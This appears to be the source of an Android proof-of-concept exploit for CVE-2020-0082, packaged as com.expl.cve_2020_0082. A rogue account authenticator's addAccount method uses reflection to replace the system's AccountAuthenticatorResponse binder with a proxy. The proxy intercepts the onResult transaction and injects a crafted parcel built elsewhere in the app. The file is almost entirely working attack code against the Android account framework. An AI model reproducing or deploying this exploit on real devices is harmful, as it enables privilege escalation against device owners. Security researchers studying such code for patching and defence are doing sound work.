package com.expl.cve_2020_0082;

import android.accounts.AbstractAccountAuthenticator;
import android.accounts.Account;
import android.accounts.AccountAuthenticatorResponse;
import android.accounts.AccountManager;
import android.accounts.NetworkErrorException;
import android.app.Service;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.net.Uri;
import android.os.Bundle;
import android.os.IBinder;
import android.os.IInterface;
import android.os.Parcel;
import android.os.RemoteException;
import android.util.Log;

import java.io.FileDescriptor;
import java.lang.reflect.Field;

/**
 * Authenticator returning {@link #addAccountResponse} when addAccount operation is requested
 */
public class AuthService extends Service {

    public static Bundle addAccountResponse;

    @Override
    public IBinder onBind(Intent intent) {
        return new Authenticator(this).getIBinder();
    }

    private static class Authenticator extends AbstractAccountAuthenticator {

        private int TRANSACTION_onResult;
        private IBinder mOriginRemote;
        private IBinder mProxyRemote = new IBinder() {
            @Override
            public String getInterfaceDescriptor() throws RemoteException {
                return null;
            }

            @Override
            public boolean pingBinder() {
                return false;
            }

            @Override
            public boolean isBinderAlive() {
                return false;
            }

            @Override
            public IInterface queryLocalInterface(String descriptor) {
                return null;
            }

            @Override
            public void dump(FileDescriptor fd, String[] args) throws RemoteException {}

            @Override
            public void dumpAsync(FileDescriptor fd, String[] args)
                    throws RemoteException {}

            @Override
            public boolean transact(int code, Parcel data, Parcel reply, int flags)
                    throws RemoteException {
                if (code == TRANSACTION_onResult) {
                    data.recycle();
                    Intent payload = new Intent();
                    payload.setAction(Intent.ACTION_REBOOT);
                    data = MainActivity.generate();
                }

                mOriginRemote.transact(code, data, reply, flags);
                return true;
            }

            @Override
            public void linkToDeath(DeathRecipient recipient, int flags)
                    throws RemoteException {}

            @Override
            public boolean unlinkToDeath(DeathRecipient recipient, int flags) {
                return false;
            }
        };

        public Authenticator(Context context) {
            super(context);
        }

        @Override
        public String getAuthTokenLabel(String authTokenType) {
            return null;
        }

        @Override
        public Bundle editProperties(AccountAuthenticatorResponse response,
                                     String accountType) {
            return null;
        }

        @Override
        public Bundle getAuthToken(AccountAuthenticatorResponse response,
                                   Account account, String authTokenType, Bundle options) {
            return null;
        }

        @Override
        public Bundle addAccount(AccountAuthenticatorResponse response,
                                 String accountType, String authTokenType, String[] requiredFeatures,
                                 Bundle options) {
            try {
                Field mAccountAuthenticatorResponseField = (Field) Class.class.getMethod("getDeclaredField", new Class[] { String.class }).invoke(MainActivity._forName("android.accounts.AccountAuthenticatorResponse"), "mAccountAuthenticatorResponse");

                mAccountAuthenticatorResponseField.setAccessible(true);

                Object mAccountAuthenticatorResponse =
                        mAccountAuthenticatorResponseField.get(response);

                Class stubClass = null;
                String responseName = "android.accounts.IAccountAuthenticatorResponse";
                Class<?>[] classes = MainActivity._forName(responseName).getDeclaredClasses();

                String stubName = responseName + ".Stub";
                for (Class inner : classes) {
                    if (inner.getCanonicalName().equals(stubName)) {
                        stubClass = inner;
                        break;
                    }
                }

                Field TRANSACTION_onResultField = (Field) Class.class.getMethod("getDeclaredField", new Class[] { String.class }).invoke(stubClass,"TRANSACTION_onResult");
                TRANSACTION_onResultField.setAccessible(true);
                TRANSACTION_onResult = TRANSACTION_onResultField.getInt(null);

                Class proxyClass = null;
                String proxyName = stubName + ".Proxy";
                for (Class inner : stubClass.getDeclaredClasses()) {
                    if (inner.getCanonicalName().equals(proxyName)) {
                        proxyClass = inner;
                        break;
                    }
                }

                Field mRemoteField = (Field) Class.class.getMethod("getDeclaredField", new Class[] { String.class }).invoke(proxyClass,"mRemote");
                mRemoteField.setAccessible(true);
                mOriginRemote = (IBinder) mRemoteField.get(mAccountAuthenticatorResponse);
                mRemoteField.set(mAccountAuthenticatorResponse, mProxyRemote);
            } catch (Exception e) {
                e.printStackTrace();
            }

            return new Bundle();
        }

        @Override
        public Bundle confirmCredentials(
                AccountAuthenticatorResponse response, Account account, Bundle options) {
            return null;
        }

        @Override
        public Bundle updateCredentials(AccountAuthenticatorResponse response,
                                        Account account, String authTokenType, Bundle options) {
            return null;
        }

        @Override
        public Bundle hasFeatures(
                AccountAuthenticatorResponse response, Account account, String[] features)
        {
            return null;
        }
    }
}
